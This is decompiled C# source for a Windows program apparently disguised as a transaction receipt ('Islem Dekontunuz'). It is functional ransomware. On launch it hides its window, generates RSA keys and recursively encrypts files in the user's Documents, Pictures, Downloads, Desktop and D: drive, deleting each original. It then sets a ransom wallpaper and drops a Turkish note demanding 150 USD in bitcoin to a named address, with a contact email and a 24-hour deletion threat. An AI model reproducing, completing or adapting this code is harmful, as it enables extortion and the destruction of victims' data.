using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;
using System.Windows.Threading;
using System.Xml.Linq;
using System.Xml.XPath;
using Encryptor;
using FileEncryptor.Properties;
using Microsoft.Win32;
using TestBase64;

namespace FileEncryptor;

public class MainWindow : Window, IComponentConnector
{
	public enum Pozisyon
	{
		Tiled,
		Centered,
		Stretched
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	private int sayi;

	private Container components = null;

	private readonly BackgroundWorker worker = new BackgroundWorker();

	private string publicKey;

	private string privateKey;

	private string manifestFilePath;

	private EventWaitHandle freeEvent;

	private string HDDserialNo = string.Empty;

	internal Grid grid_encrypt;

	internal TextBox tb_plainFilePath;

	internal Button bt_selPlain;

	internal Button bt_setting;

	internal TextBox tb_output;

	internal Button btnEncrypt;

	internal TextBox txtCustomKey;

	internal TextBox txtInputText;

	internal TextBox txtOutputText;

	internal CheckBox chkIsCustomKey;

	internal TextBox txtDecoded;

	internal Label label1;

	internal TextBox Dosyavar;

	internal TextBox dosyacoz;

	internal TextBox cryptographer;

	internal Button button;

	internal MenuItem mi_switch;

	internal MenuItem mi_genKeyPair;

	internal MenuItem mi_convertKey;

	internal Grid grid_decrypt;

	internal TextBox tb_encryptedFilePath;

	internal Button bt_selEncrypted;

	internal TextBox tb_outputDecrypt;

	internal Button bt_decrypt;

	internal Button bt_settingDecrypt;

	private bool _contentLoaded;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public MainWindow()
	{
		((Window)this).Hide();
		worker.DoWork += worker_DoWork;
		worker.RunWorkerCompleted += worker_RunWorkerCompleted;
		InitializeComponent();
		publicKey = null;
		freeEvent = new EventWaitHandle(initialState: true, EventResetMode.ManualReset);
		List<string> list = HDDSeriNoCek();
		foreach (string item in list)
		{
			HDDserialNo += item;
		}
		HDDserialNo = HDDserialNo.TrimStart(new char[0]);
		txtCustomKey.set_Text(HDDserialNo);
		string path = "C:\\Users\\" + Environment.UserName + "\\Documents\\publicKey.xml";
		if (File.Exists(path))
		{
			Dosyavar.set_Text(File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\publicKey.xml"));
			char[] input = Dosyavar.get_Text().ToCharArray();
			Base64Decoder base64Decoder = new Base64Decoder(input);
			StringBuilder stringBuilder = new StringBuilder();
			byte[] decoded = base64Decoder.GetDecoded();
			stringBuilder.Append(Encoding.UTF8.GetChars(decoded));
			string current = stringBuilder.ToString();
			current = current.Replace("<" + txtCustomKey.get_Text() + ">", "");
			dosyacoz.set_Text(current);
			cryptographer.set_Text(SSTCryptographer.Decrypt(dosyacoz.get_Text(), SetKey()));
			publicKey = cryptographer.get_Text();
			worker.RunWorkerAsync();
			return;
		}
		string path2 = "C:\\Users\\" + Environment.UserName + "\\Documents\\";
		string path3 = Path.Combine(path2, "publicKey.xml");
		string path4 = Path.Combine(path2, "privateKey.xml");
		Encipher.GenerateRSAKeyPair(out var text, out var text2);
		using (StreamWriter streamWriter = File.CreateText(path3))
		{
			txtInputText.set_Text(text);
			txtOutputText.set_Text(SSTCryptographer.Encrypt(txtInputText.get_Text(), SetKey()));
			byte[] bytes = Encoding.UTF8.GetBytes("<" + txtCustomKey.get_Text() + ">" + txtOutputText.get_Text());
			Base64Encoder base64Encoder = new Base64Encoder(bytes);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(base64Encoder.GetEncoded());
			txtDecoded.set_Text(stringBuilder.ToString());
			streamWriter.Write(txtDecoded.get_Text());
			publicKey = text;
		}
		using StreamWriter streamWriter = File.CreateText(path4);
		txtInputText.Clear();
		txtOutputText.Clear();
		txtDecoded.Clear();
		txtInputText.set_Text(text2);
		txtOutputText.set_Text(SSTCryptographer.Encrypt(txtInputText.get_Text(), SetKey()));
		byte[] bytes = Encoding.UTF8.GetBytes("<" + txtCustomKey.get_Text() + ">" + txtOutputText.get_Text());
		Base64Encoder base64Encoder = new Base64Encoder(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(base64Encoder.GetEncoded());
		txtDecoded.set_Text(stringBuilder.ToString());
		streamWriter.Write(txtDecoded.get_Text());
		worker.RunWorkerAsync();
	}

	private static IEnumerable<DirectoryInfo> GetDirectories(DirectoryInfo parentDirectory)
	{
		DirectoryInfo[] childDirectories = null;
		try
		{
			childDirectories = parentDirectory.GetDirectories();
		}
		catch (Exception)
		{
		}
		yield return parentDirectory;
		if (childDirectories == null)
		{
			yield break;
		}
		try
		{
			DirectoryInfo[] array = childDirectories;
			foreach (DirectoryInfo childDirectory in array)
			{
				IEnumerable<DirectoryInfo> childDirectories2 = GetDirectories(childDirectory);
				foreach (DirectoryInfo item in childDirectories2)
				{
					yield return item;
				}
			}
		}
		finally
		{
		}
	}

	private static IEnumerable<FileInfo> GetFiles(DirectoryInfo parentDirectory, string searchPattern)
	{
		IEnumerable<DirectoryInfo> directories = GetDirectories(parentDirectory);
		foreach (DirectoryInfo directory in directories)
		{
			FileInfo[] infos = null;
			try
			{
				infos = directory.GetFiles(searchPattern);
			}
			catch (Exception)
			{
			}
			if (infos == null)
			{
				continue;
			}
			try
			{
				FileInfo[] array = infos;
				for (int i = 0; i < array.Length; i++)
				{
					yield return array[i];
				}
			}
			finally
			{
			}
		}
	}

	private void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		Bitmap val = new Bitmap((Image)(object)Resources.images);
		((Image)val).Save("C:\\Users\\" + Environment.UserName + "\\Documents\\images.jpg");
		SystemParametersInfo(20, 0, "C:\\Users\\" + Environment.UserName + "\\Documents\\images.jpg", 1);
		MainWindow mainWindow = new MainWindow();
		mainWindow.ArkaPlaniDegistir("C:\\Users\\" + Environment.UserName + "\\Documents\\images.jpg", Pozisyon.Centered);
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Documents\\Beni Oku.txt", "1 - Dosyalarınızdaki şifrelemeyi kaldırmak için 12UamJ75Pf4skx4P9r3hn3whvoKUfbbURf bitcoin adresine 150 USD değerinde bitcoin göndermeniz gerekmektedir." + Environment.NewLine + "2 - 150 USD değerinde bitcoin gönderimi yapıldıktan sonra d3crypt0r@lelantos.org adresine Belgelerim klasörünüzün içerisinde bulunan privateKey.XML dosyasını" + Environment.NewLine + "göndermeniz, gerekmekte dosyayı gönderdikten sonra dosyalarınıza uygun şifre çözme anahtarı size gönderilecek ve dosyalarınızdaki şifreleri açacaksınız." + Environment.NewLine + "3 - Bitcoin alımlarını https://localbitcoins.com/ üzerinden yada bu tarz emsal sitelerden yapabilirsiniz." + Environment.NewLine + "4 - Dosyalarınızdaki şifreleri çözmeye uğraşmanız sadece dosyalarınıza zarar vereceğiniz ve veri kaybına yol açmasına sebep olacaktır." + Environment.NewLine + "5 - 24 saat içerisinde şifreleri çözülmeyen dosyalar otomatik olarak harddiskinizden geri gelmeyecek şekilde silinecektir." + Environment.NewLine + "6 - Detaylı bilgi için d3crypt0r@lelantos.org adresine mail gönderebilirsiniz.");
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\Beni Oku.txt", "1 - Dosyalarınızdaki şifrelemeyi kaldırmak için 12UamJ75Pf4skx4P9r3hn3whvoKUfbbURf bitcoin adresine 150 USD değerinde bitcoin göndermeniz gerekmektedir." + Environment.NewLine + "2 - 150 USD değerinde bitcoin gönderimi yapıldıktan sonra d3crypt0r@lelantos.org adresine Belgelerim klasörünüzün içerisinde bulunan privateKey.XML dosyasını" + Environment.NewLine + "göndermeniz, gerekmekte dosyayı gönderdikten sonra dosyalarınıza uygun şifre çözme anahtarı size gönderilecek ve dosyalarınızdaki şifreleri açacaksınız." + Environment.NewLine + "3 - Bitcoin alımlarını https://localbitcoins.com/ üzerinden yada bu tarz emsal sitelerden yapabilirsiniz." + Environment.NewLine + "4 - Dosyalarınızdaki şifreleri çözmeye uğraşmanız sadece dosyalarınıza zarar vereceğiniz ve veri kaybına yol açmasına sebep olacaktır." + Environment.NewLine + "5 - 24 saat içerisinde şifreleri çözülmeyen dosyalar otomatik olarak harddiskinizden geri gelmeyecek şekilde silinecektir." + Environment.NewLine + "6 - Detaylı bilgi için d3crypt0r@lelantos.org adresine mail gönderebilirsiniz.");
		Environment.Exit(0);
	}

	private void worker_DoWork(object sender, DoWorkEventArgs e)
	{
		//IL_027a: Unknown result type (might be due to invalid IL or missing references)
		DirectoryInfo parentDirectory = new DirectoryInfo("C:\\Users\\" + Environment.UserName + "\\Documents");
		DirectoryInfo parentDirectory2 = new DirectoryInfo("C:\\Users\\" + Environment.UserName + "\\Pictures");
		DirectoryInfo parentDirectory3 = new DirectoryInfo("C:\\Users\\" + Environment.UserName + "\\Downloads");
		DirectoryInfo parentDirectory4 = new DirectoryInfo("C:\\Users\\" + Environment.UserName + "\\Desktop");
		DirectoryInfo parentDirectory5 = new DirectoryInfo("D:\\");
		IEnumerable<FileInfo> files = GetFiles(parentDirectory, ".");
		IEnumerable<FileInfo> files2 = GetFiles(parentDirectory2, ".");
		IEnumerable<FileInfo> files3 = GetFiles(parentDirectory3, ".");
		IEnumerable<FileInfo> files4 = GetFiles(parentDirectory4, ".");
		IEnumerable<FileInfo> files5 = GetFiles(parentDirectory5, ".");
		using IEnumerator<FileInfo> enumerator = files.Concat(files2.Concat(files3.Concat(files4.Concat(files5)))).GetEnumerator();
		while (enumerator.MoveNext())
		{
			Action action = null;
			FileInfo f = enumerator.Current;
			Dispatcher dispatcher = ((DispatcherObject)this).get_Dispatcher();
			action = delegate
			{
				tb_plainFilePath.set_Text(f.FullName);
			};
			dispatcher.Invoke((Delegate)action, (object[])null);
			if (!freeEvent.WaitOne())
			{
				continue;
			}
			if (!freeEvent.WaitOne(0))
			{
				break;
			}
			string extension = Path.GetExtension(f.FullName);
			if (extension == ".encrypted" || extension == ".xml")
			{
				continue;
			}
			if (!string.IsNullOrEmpty(publicKey))
			{
				string fullName = f.FullName;
				FileInfo fileInfo = new FileInfo(f.FullName);
				string extension2 = fileInfo.Extension;
				string encryptedFilePath = MakePath(fullName, extension2 + ".encrypted");
				string text = MakePath(fullName, ".manifest.xml");
				((DispatcherObject)this).get_Dispatcher().Invoke((Delegate)(Action)delegate
				{
					tb_output.set_Text(Resources.Out_msg_start_encryption);
				}, (object[])null);
				freeEvent.Reset();
				string text2 = Encipher.Encrypt(fullName, encryptedFilePath, text, publicKey);
				freeEvent.Set();
				UpdateOutput(tb_output, Resources.Out_msg_encrypt_success + "\r\n" + text2, append: true);
				try
				{
					File.Delete(f.FullName);
				}
				catch (Exception)
				{
				}
				finally
				{
				}
				continue;
			}
			MessageBox.Show((Window)(object)this, Resources.Error_Need_PublicKey);
			break;
		}
	}

	private void bt_selPlain_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_DefaultExt(".*");
		((FileDialog)val).set_Filter(Resources.All_File_Type);
		((FileDialog)val).set_Title(Resources.DialogTitle_SelectPlain);
		if (((CommonDialog)val).ShowDialog() == true)
		{
			tb_plainFilePath.set_Text(((FileDialog)val).get_FileName());
		}
	}

	private void tb_output_TextChanged(object sender, TextChangedEventArgs e)
	{
		((TextBoxBase)tb_output).ScrollToEnd();
	}

	public void ArkaPlaniDegistir(string path, Pozisyon Pozisyon)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		switch (Pozisyon)
		{
		case Pozisyon.Tiled:
			registryKey.SetValue("WallpaperPozisyon", "1");
			registryKey.SetValue("TileWallpaper", "1");
			break;
		case Pozisyon.Centered:
			registryKey.SetValue("WallpaperPozisyon", "1");
			registryKey.SetValue("TileWallpaper", "0");
			break;
		case Pozisyon.Stretched:
			registryKey.SetValue("WallpaperPozisyon", "2");
			registryKey.SetValue("TileWallpaper", "0");
			break;
		}
		SystemParametersInfo(20, 0, path, 3);
	}

	private void bt_encrypt_Click(object sender, RoutedEventArgs e)
	{
		worker.RunWorkerAsync();
	}

	private void UpdateOutput(TextBox tb, string message, bool append)
	{
		((DispatcherObject)this).get_Dispatcher().Invoke((Delegate)(Action)delegate
		{
		}, (object[])null);
	}

	private void bt_setting_Click(object sender, RoutedEventArgs e)
	{
		SettingWindow settingWindow = new SettingWindow();
		settingWindow.PublicKey = publicKey;
		if (((Window)settingWindow).ShowDialog() == true)
		{
			publicKey = settingWindow.PublicKey;
		}
	}

	private static string MakePath(string plainFilePath, string newSuffix)
	{
		string path = Path.GetFileNameWithoutExtension(plainFilePath) + newSuffix;
		return Path.Combine(Path.GetDirectoryName(plainFilePath), path);
	}

	private void mi_genKeyPair_Click(object sender, RoutedEventArgs e)
	{
		string path = "C:\\Users\\" + Environment.UserName + "\\Documents\\";
		string path2 = Path.Combine(path, "publicKey.xml");
		string path3 = Path.Combine(path, "privateKey.xml");
		Encipher.GenerateRSAKeyPair(out var text, out var text2);
		using (StreamWriter streamWriter = File.CreateText(path2))
		{
			txtInputText.set_Text(text);
			txtOutputText.set_Text(SSTCryptographer.Encrypt(txtInputText.get_Text(), SetKey()));
			byte[] bytes = Encoding.UTF8.GetBytes("<" + txtCustomKey.get_Text() + ">" + txtOutputText.get_Text());
			Base64Encoder base64Encoder = new Base64Encoder(bytes);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(base64Encoder.GetEncoded());
			txtDecoded.set_Text(stringBuilder.ToString());
			streamWriter.Write(txtDecoded.get_Text());
			publicKey = text;
		}
		using StreamWriter streamWriter = File.CreateText(path3);
		txtInputText.Clear();
		txtOutputText.Clear();
		txtDecoded.Clear();
		txtInputText.set_Text(text2);
		txtOutputText.set_Text(SSTCryptographer.Encrypt(txtInputText.get_Text(), SetKey()));
		byte[] bytes = Encoding.UTF8.GetBytes("<" + txtCustomKey.get_Text() + ">" + txtOutputText.get_Text());
		Base64Encoder base64Encoder = new Base64Encoder(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(base64Encoder.GetEncoded());
		txtDecoded.set_Text(stringBuilder.ToString());
		streamWriter.Write(txtDecoded.get_Text());
	}

	private void mi_switch_Click(object sender, RoutedEventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Invalid comparison between Unknown and I4
		if (!freeEvent.WaitOne(0))
		{
			MessageBox.Show(Resources.Backend_Busy);
		}
		else if ((int)((UIElement)grid_encrypt).get_Visibility() == 0)
		{
			((UIElement)grid_encrypt).set_Visibility((Visibility)2);
			((UIElement)grid_decrypt).set_Visibility((Visibility)0);
		}
		else
		{
			((UIElement)grid_encrypt).set_Visibility((Visibility)0);
			((UIElement)grid_decrypt).set_Visibility((Visibility)2);
		}
	}

	private void bt_selEncrypted_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_DefaultExt(".*");
		((FileDialog)val).set_Filter(Resources.All_File_Type);
		((FileDialog)val).set_Title(Resources.DialogTitle_SelectPlain);
		if (((CommonDialog)val).ShowDialog() == true)
		{
			tb_encryptedFilePath.set_Text(((FileDialog)val).get_FileName());
		}
	}

	private void bt_decrypt_Click(object sender, RoutedEventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		if (!freeEvent.WaitOne(0))
		{
			MessageBox.Show(Resources.Backend_Busy);
			return;
		}
		string keyXml = privateKey;
		string encryptedFile = tb_encryptedFilePath.get_Text();
		string plainFile = MakePath(encryptedFile, ".decrypted");
		string text = manifestFilePath;
		XDocument val = XDocument.Load(text);
		XElement val2 = Extensions.XPathSelectElement((XNode)(object)val.get_Root(), "./DataEncryption/AESEncryptedKeyValue/Key");
		byte[] aesKey = Encipher.RSADescryptBytes(Convert.FromBase64String(val2.get_Value()), keyXml);
		XElement val3 = Extensions.XPathSelectElement((XNode)(object)val.get_Root(), "./DataEncryption/AESEncryptedKeyValue/IV");
		byte[] aesIv = Encipher.RSADescryptBytes(Convert.FromBase64String(val3.get_Value()), keyXml);
		tb_outputDecrypt.set_Text(Resources.Out_msg_start_decryption);
		Task.Factory.StartNew(delegate
		{
			freeEvent.Reset();
			Encipher.DecryptFile(plainFile, encryptedFile, aesKey, aesIv);
			freeEvent.Set();
			UpdateOutput(tb_outputDecrypt, string.Format(Resources.Out_msg_decryption_success, plainFile), append: true);
		});
	}

	private void bt_settingDecrypt_Click(object sender, RoutedEventArgs e)
	{
		DecryptionSettingWindow decryptionSettingWindow = new DecryptionSettingWindow();
		decryptionSettingWindow.Key = privateKey;
		decryptionSettingWindow.ManifestFilePath = manifestFilePath;
		if (((Window)decryptionSettingWindow).ShowDialog() == true)
		{
			privateKey = decryptionSettingWindow.Key;
			manifestFilePath = decryptionSettingWindow.ManifestFilePath;
		}
	}

	private void mi_convertKey_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_DefaultExt(".pem");
		((FileDialog)val).set_Filter(Resources.PEM_File_Type);
		((FileDialog)val).set_Title(Resources.DialogTitle_SelectPem);
		if (((CommonDialog)val).ShowDialog() != true)
		{
			return;
		}
		string pemstr = null;
		using (StreamReader streamReader = File.OpenText(((FileDialog)val).get_FileName()))
		{
			pemstr = streamReader.ReadToEnd().Trim();
		}
		opensslkey.DecodePEMKey(pemstr, out var text, out var text2);
		string path = MakePath(((FileDialog)val).get_FileName(), ".xml");
		string path2 = MakePath(((FileDialog)val).get_FileName(), ".xml");
		if (text != null)
		{
			using StreamWriter streamWriter = File.CreateText(path);
			streamWriter.Write(text);
		}
		else
		{
			MessageBox.Show(Resources.Error_convertToPublicKey);
		}
		if (text2 != null)
		{
			using (StreamWriter streamWriter = File.CreateText(path2))
			{
				streamWriter.Write(text2);
				return;
			}
		}
		MessageBox.Show(Resources.Error_convertToPrivateKey);
	}

	private void tb_outputDecrypt_TextChanged(object sender, TextChangedEventArgs e)
	{
		((TextBoxBase)tb_outputDecrypt).ScrollToEnd();
	}

	private void btnEncrypt_Click(object sender, RoutedEventArgs e)
	{
		txtOutputText.set_Text(SSTCryptographer.Encrypt(txtInputText.get_Text(), SetKey()));
	}

	private void chkIsCustomKey_CheckedChanged(object sender, EventArgs e)
	{
		if (((ToggleButton)chkIsCustomKey).get_IsChecked().Value)
		{
			((UIElement)txtCustomKey).set_IsEnabled(true);
			return;
		}
		((UIElement)txtCustomKey).set_IsEnabled(false);
		txtCustomKey.set_Text(string.Empty);
	}

	private string SetKey()
	{
		if (((ToggleButton)chkIsCustomKey).get_IsChecked().Value)
		{
			if (txtCustomKey.get_Text() != string.Empty)
			{
				return txtCustomKey.get_Text();
			}
			return "SampleKey";
		}
		return "SampleKey";
	}

	public static List<string> HDDSeriNoCek()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				if (((ManagementBaseObject)val3).get_Item("SerialNumber") == null)
				{
					list.Add("");
				}
				else
				{
					list.Add(((ManagementBaseObject)val3).get_Item("SerialNumber").ToString());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return list;
	}

	private void Button_Click_1(object sender, RoutedEventArgs e)
	{
	}

	private void button_Click(object sender, RoutedEventArgs e)
	{
	}

	private void button_Click_2(object sender, RoutedEventArgs e)
	{
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/Islem Dekontunuz;component/mainwindow.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	[DebuggerNonUserCode]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_014d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_0191: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_021f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0229: Expected O, but got Unknown
		//IL_0236: Unknown result type (might be due to invalid IL or missing references)
		//IL_0240: Expected O, but got Unknown
		//IL_0247: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_026f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Expected O, but got Unknown
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		//IL_0290: Expected O, but got Unknown
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a1: Expected O, but got Unknown
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Expected O, but got Unknown
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Expected O, but got Unknown
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02de: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Expected O, but got Unknown
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ff: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_031a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0324: Expected O, but got Unknown
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_0332: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		switch (connectionId)
		{
		default:
			_contentLoaded = true;
			break;
		case 1:
			grid_encrypt = (Grid)target;
			break;
		case 2:
			tb_plainFilePath = (TextBox)target;
			break;
		case 3:
			bt_selPlain = (Button)target;
			((ButtonBase)bt_selPlain).add_Click(new RoutedEventHandler(bt_selPlain_Click));
			break;
		case 4:
			bt_setting = (Button)target;
			((ButtonBase)bt_setting).add_Click(new RoutedEventHandler(bt_setting_Click));
			break;
		case 5:
			((ButtonBase)(Button)target).add_Click(new RoutedEventHandler(bt_encrypt_Click));
			break;
		case 6:
			tb_output = (TextBox)target;
			((TextBoxBase)tb_output).add_TextChanged(new TextChangedEventHandler(tb_output_TextChanged));
			break;
		case 7:
			btnEncrypt = (Button)target;
			((ButtonBase)btnEncrypt).add_Click(new RoutedEventHandler(btnEncrypt_Click));
			break;
		case 8:
			txtCustomKey = (TextBox)target;
			break;
		case 9:
			txtInputText = (TextBox)target;
			break;
		case 10:
			txtOutputText = (TextBox)target;
			break;
		case 11:
			chkIsCustomKey = (CheckBox)target;
			break;
		case 12:
			txtDecoded = (TextBox)target;
			break;
		case 13:
			label1 = (Label)target;
			break;
		case 14:
			Dosyavar = (TextBox)target;
			break;
		case 15:
			dosyacoz = (TextBox)target;
			break;
		case 16:
			cryptographer = (TextBox)target;
			break;
		case 17:
			button = (Button)target;
			((ButtonBase)button).add_Click(new RoutedEventHandler(button_Click_2));
			break;
		case 18:
			mi_switch = (MenuItem)target;
			mi_switch.add_Click(new RoutedEventHandler(mi_switch_Click));
			break;
		case 19:
			mi_genKeyPair = (MenuItem)target;
			mi_genKeyPair.add_Click(new RoutedEventHandler(mi_genKeyPair_Click));
			break;
		case 20:
			mi_convertKey = (MenuItem)target;
			mi_convertKey.add_Click(new RoutedEventHandler(mi_convertKey_Click));
			break;
		case 21:
			grid_decrypt = (Grid)target;
			break;
		case 22:
			tb_encryptedFilePath = (TextBox)target;
			break;
		case 23:
			bt_selEncrypted = (Button)target;
			((ButtonBase)bt_selEncrypted).add_Click(new RoutedEventHandler(bt_selEncrypted_Click));
			break;
		case 24:
			tb_outputDecrypt = (TextBox)target;
			((TextBoxBase)tb_outputDecrypt).add_TextChanged(new TextChangedEventHandler(tb_outputDecrypt_TextChanged));
			break;
		case 25:
			bt_decrypt = (Button)target;
			((ButtonBase)bt_decrypt).add_Click(new RoutedEventHandler(bt_decrypt_Click));
			break;
		case 26:
			bt_settingDecrypt = (Button)target;
			((ButtonBase)bt_settingDecrypt).add_Click(new RoutedEventHandler(bt_settingDecrypt_Click));
			break;
		}
	}
}
